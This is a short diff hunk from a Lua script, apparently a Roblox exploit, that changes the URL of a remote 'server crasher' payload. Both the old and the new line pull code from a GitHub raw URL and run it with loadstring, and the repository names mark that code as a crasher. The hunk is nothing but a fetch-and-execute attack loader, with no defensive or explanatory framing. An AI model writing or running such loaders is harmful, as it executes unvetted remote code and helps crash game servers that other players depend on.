@@ -383,7 +383,7 @@ local function p(n, q)
             if not b then
                 loadstring(
                     game:HttpGet(
-                        "https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher"
+                        "https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash"
                     )
                 )()
             end
